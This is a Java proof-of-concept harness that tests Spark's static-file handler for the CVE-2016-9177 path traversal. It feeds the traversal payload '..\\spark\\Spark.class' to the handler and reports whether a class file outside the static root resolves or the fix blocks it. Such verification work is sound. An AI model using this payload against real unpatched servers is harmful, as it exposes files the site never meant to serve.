package spark.resource;
import java.lang.reflect.Method;
import java.net.URLEncoder;

/**
 * Witness for CVE-2016-9177 (CWE-22 path traversal) in Spark's static-file handler.
 * Source: the HTTP request path (already url-decoded, as the servlet passes it to getResource).
 * Sink:   ClassPathResourceHandler.getResource -> ClassPathResource resolution/read.
 * The fix adds DirectoryTraversal.protectAgainstInClassPath(resource.getPath()); the buggy
 * handler has no guard. Static root = "public"; payload = Spark's documented ..\\spark\\Spark.class,
 * targeting a class file OUTSIDE "public". StaticFilesFolder is set reflectively (fixed only).
 */
public class SparkWitness {
  public static void main(String[] a) throws Exception {
    try { // configure the static root for the fix's guard (class absent in the buggy version)
      Class<?> sff = Class.forName("spark.staticfiles.StaticFilesFolder");
      sff.getMethod("localConfiguredTo", String.class).invoke(null, "/public");
    } catch (ClassNotFoundException ignore) {}
    ClassPathResourceHandler h = new ClassPathResourceHandler("/public", null);
    String decoded = java.net.URLDecoder.decode("/" + URLEncoder.encode("..\\spark\\", "UTF-8") + "Spark.class", "UTF-8");
    Method get = AbstractResourceHandler.class.getDeclaredMethod("getResource", String.class); get.setAccessible(true);
    String outcome, resolvedPath = ""; boolean blocked = false, resolvedOutside = false;
    try {
      Object res = get.invoke(h, decoded);
      if (res == null) outcome = "null (not resolved)";
      else {
        resolvedPath = String.valueOf(res.getClass().getMethod("getPath").invoke(res));
        boolean exists = (Boolean) res.getClass().getMethod("exists").invoke(res);
        resolvedOutside = exists && !strip(resolvedPath).startsWith("public");
        outcome = "resource exists=" + exists + " path=" + resolvedPath + " outsideStaticRoot=" + resolvedOutside;
      }
    } catch (Throwable t) {
      Throwable c = (t.getCause() != null) ? t.getCause() : t;
      blocked = c.getClass().getName().contains("DirectoryTraversalDetection");
      outcome = (blocked ? "BLOCKED by fix: " : "error: ") + c.getClass().getName() + ": " + c.getMessage();
    }
    boolean witnessed = resolvedOutside && !blocked;
    System.out.println("{"
      + "\"subject\":\"spark\",\"cve\":\"CVE-2016-9177\",\"cwe\":\"CWE-22\","
      + "\"source\":\"request path '" + esc(decoded) + "' (static root=/public)\","
      + "\"sink\":\"ClassPathResourceHandler.getResource -> ClassPathResource\","
      + "\"witnessed\":" + witnessed + ",\"fix_blocked\":" + blocked + ","
      + "\"evidence\":\"" + esc(outcome) + "\"}");
  }
  static String strip(String s){ while(s.startsWith("/")) s=s.substring(1); return s; }
  static String esc(String s){ return s==null?"":s.replace("\\","\\\\").replace("\"","\\\"").replace("\n"," "); }
}
